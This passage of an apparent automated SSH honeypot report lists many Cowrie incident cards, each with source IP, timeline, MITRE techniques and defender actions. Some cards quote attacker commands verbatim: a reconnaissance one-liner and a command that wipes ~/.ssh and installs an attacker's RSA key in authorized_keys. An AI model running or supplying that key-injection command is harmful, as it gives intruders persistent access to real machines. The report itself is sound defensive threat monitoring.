| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:34:10` | `cowrie.session.connect` |
| `2026-07-05 03:34:11` | `cowrie.client.version` |
| `2026-07-05 03:34:11` | `cowrie.client.kex` |
| `2026-07-05 03:34:13` | `cowrie.login.success` |
| `2026-07-05 03:34:15` | `cowrie.session.params` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.success` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:15` | `cowrie.command.input` |
| `2026-07-05 03:34:16` | `cowrie.log.closed` |
| `2026-07-05 03:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ebcd0fa7e52

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:35 |
| **Last Seen** | 2026-07-05 03:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:35:41` | `cowrie.session.connect` |
| `2026-07-05 03:35:42` | `cowrie.client.version` |
| `2026-07-05 03:35:42` | `cowrie.client.kex` |
| `2026-07-05 03:35:45` | `cowrie.login.success` |
| `2026-07-05 03:35:46` | `cowrie.session.params` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.success` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:46` | `cowrie.command.input` |
| `2026-07-05 03:35:47` | `cowrie.log.closed` |
| `2026-07-05 03:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1d8f080241

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 03:37 |
| **Last Seen** | 2026-07-05 03:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:37:00` | `cowrie.session.connect` |
| `2026-07-05 03:37:00` | `cowrie.client.version` |
| `2026-07-05 03:37:00` | `cowrie.client.kex` |
| `2026-07-05 03:37:00` | `cowrie.login.success` |
| `2026-07-05 03:37:01` | `cowrie.direct-tcpip.request` |
| `2026-07-05 03:37:01` | `cowrie.direct-tcpip.data` |
| `2026-07-05 03:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc542c605ba7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:38 |
| **Last Seen** | 2026-07-05 03:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:38:42` | `cowrie.session.connect` |
| `2026-07-05 03:38:43` | `cowrie.client.version` |
| `2026-07-05 03:38:43` | `cowrie.client.kex` |
| `2026-07-05 03:38:47` | `cowrie.login.success` |
| `2026-07-05 03:38:49` | `cowrie.session.params` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.success` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:49` | `cowrie.command.input` |
| `2026-07-05 03:38:50` | `cowrie.log.closed` |
| `2026-07-05 03:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5466ce38ecdf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:40 |
| **Last Seen** | 2026-07-05 03:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:40:13` | `cowrie.session.connect` |
| `2026-07-05 03:40:14` | `cowrie.client.version` |
| `2026-07-05 03:40:14` | `cowrie.client.kex` |
| `2026-07-05 03:40:17` | `cowrie.login.success` |
| `2026-07-05 03:40:19` | `cowrie.session.params` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.success` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:19` | `cowrie.command.input` |
| `2026-07-05 03:40:21` | `cowrie.log.closed` |
| `2026-07-05 03:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fcfba0129df

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-07-05 03:40 |
| **Last Seen** | 2026-07-05 03:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:40:34` | `cowrie.session.connect` |
| `2026-07-05 03:40:34` | `cowrie.client.version` |
| `2026-07-05 03:40:34` | `cowrie.client.kex` |
| `2026-07-05 03:40:35` | `cowrie.login.success` |
| `2026-07-05 03:40:36` | `cowrie.session.params` |
| `2026-07-05 03:40:36` | `cowrie.command.input` |
| `2026-07-05 03:40:36` | `cowrie.command.failed` |
| `2026-07-05 03:40:36` | `cowrie.log.closed` |
| `2026-07-05 03:40:37` | `cowrie.session.params` |
| `2026-07-05 03:40:37` | `cowrie.command.input` |
| `2026-07-05 03:40:38` | `cowrie.session.file_download` |
| `2026-07-05 03:40:38` | `cowrie.log.closed` |
| `2026-07-05 03:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7647804af6e1

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-07-05 03:40 |
| **Last Seen** | 2026-07-05 03:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:40:38` | `cowrie.session.connect` |
| `2026-07-05 03:40:38` | `cowrie.client.version` |
| `2026-07-05 03:40:38` | `cowrie.client.kex` |
| `2026-07-05 03:40:39` | `cowrie.login.success` |
| `2026-07-05 03:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f969584aafc

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-07-05 03:40 |
| **Last Seen** | 2026-07-05 03:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:40:39` | `cowrie.session.connect` |
| `2026-07-05 03:40:39` | `cowrie.client.version` |
| `2026-07-05 03:40:40` | `cowrie.client.kex` |
| `2026-07-05 03:40:40` | `cowrie.login.success` |
| `2026-07-05 03:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2bd184bdd6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:41 |
| **Last Seen** | 2026-07-05 03:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:41:45` | `cowrie.session.connect` |
| `2026-07-05 03:41:46` | `cowrie.client.version` |
| `2026-07-05 03:41:46` | `cowrie.client.kex` |
| `2026-07-05 03:41:48` | `cowrie.login.success` |
| `2026-07-05 03:41:50` | `cowrie.session.params` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.success` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:50` | `cowrie.command.input` |
| `2026-07-05 03:41:51` | `cowrie.log.closed` |
| `2026-07-05 03:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5457abb7961

| Field | Detail |
|---|---|
| **Source IP** | `112.53.123[.]177` |
| **First Seen** | 2026-07-05 03:42 |
| **Last Seen** | 2026-07-05 03:45 |
| **Session Duration** | 176s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:42:11` | `cowrie.session.connect` |
| `2026-07-05 03:42:11` | `cowrie.client.version` |
| `2026-07-05 03:42:11` | `cowrie.client.kex` |
| `2026-07-05 03:42:12` | `cowrie.login.success` |
| `2026-07-05 03:45:07` | `cowrie.session.file_upload` |
| `2026-07-05 03:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.53.123[.]177` to AbuseIPDB if not already reported
- [ ] Block `112.53.123[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9580f082ed6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 03:42 |
| **Last Seen** | 2026-07-05 03:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:42:15` | `cowrie.session.connect` |
| `2026-07-05 03:42:16` | `cowrie.client.version` |
| `2026-07-05 03:42:16` | `cowrie.client.kex` |
| `2026-07-05 03:42:21` | `cowrie.login.success` |
| `2026-07-05 03:42:25` | `cowrie.session.params` |
| `2026-07-05 03:42:25` | `cowrie.command.input` |
| `2026-07-05 03:42:27` | `cowrie.log.closed` |
| `2026-07-05 03:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e896d3c122cd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:43 |
| **Last Seen** | 2026-07-05 03:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:43:15` | `cowrie.session.connect` |
| `2026-07-05 03:43:16` | `cowrie.client.version` |
| `2026-07-05 03:43:16` | `cowrie.client.kex` |
| `2026-07-05 03:43:19` | `cowrie.login.success` |
| `2026-07-05 03:43:21` | `cowrie.session.params` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.success` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:21` | `cowrie.command.input` |
| `2026-07-05 03:43:23` | `cowrie.log.closed` |
| `2026-07-05 03:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-131c8d8fa47d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:44 |
| **Last Seen** | 2026-07-05 03:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:44:47` | `cowrie.session.connect` |
| `2026-07-05 03:44:48` | `cowrie.client.version` |
| `2026-07-05 03:44:48` | `cowrie.client.kex` |
| `2026-07-05 03:44:50` | `cowrie.login.success` |
| `2026-07-05 03:44:51` | `cowrie.session.params` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.success` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.command.input` |
| `2026-07-05 03:44:51` | `cowrie.log.closed` |
| `2026-07-05 03:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54957a6a8924

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-07-05 03:45 |
| **Last Seen** | 2026-07-05 03:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:45:29` | `cowrie.session.connect` |
| `2026-07-05 03:45:29` | `cowrie.client.version` |
| `2026-07-05 03:45:29` | `cowrie.client.kex` |
| `2026-07-05 03:45:30` | `cowrie.login.success` |
| `2026-07-05 03:45:31` | `cowrie.session.params` |
| `2026-07-05 03:45:31` | `cowrie.command.input` |
| `2026-07-05 03:45:31` | `cowrie.command.failed` |
| `2026-07-05 03:45:32` | `cowrie.log.closed` |
| `2026-07-05 03:45:33` | `cowrie.session.params` |
| `2026-07-05 03:45:33` | `cowrie.command.input` |
| `2026-07-05 03:45:33` | `cowrie.session.file_download` |
| `2026-07-05 03:45:33` | `cowrie.log.closed` |
| `2026-07-05 03:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f1b0d74a2a

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-07-05 03:45 |
| **Last Seen** | 2026-07-05 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:45:33` | `cowrie.session.connect` |
| `2026-07-05 03:45:33` | `cowrie.client.version` |
| `2026-07-05 03:45:33` | `cowrie.client.kex` |
| `2026-07-05 03:45:34` | `cowrie.login.success` |
| `2026-07-05 03:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b105333ffda0

| Field | Detail |
|---|---|
| **Source IP** | `112.219.151[.]50` |
| **First Seen** | 2026-07-05 03:45 |
| **Last Seen** | 2026-07-05 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 03:45:35` | `cowrie.session.connect` |
| `2026-07-05 03:45:35` | `cowrie.client.version` |
| `2026-07-05 03:45:35` | `cowrie.client.kex` |
| `2026-07-05 03:45:36` | `cowrie.login.success` |
| `2026-07-05 03:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.151[.]50` to AbuseIPDB if not already reported
- [ ] Block `112.219.151[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4226c79962cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 03:46 |
| **Last Seen** | 2026-07-05 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
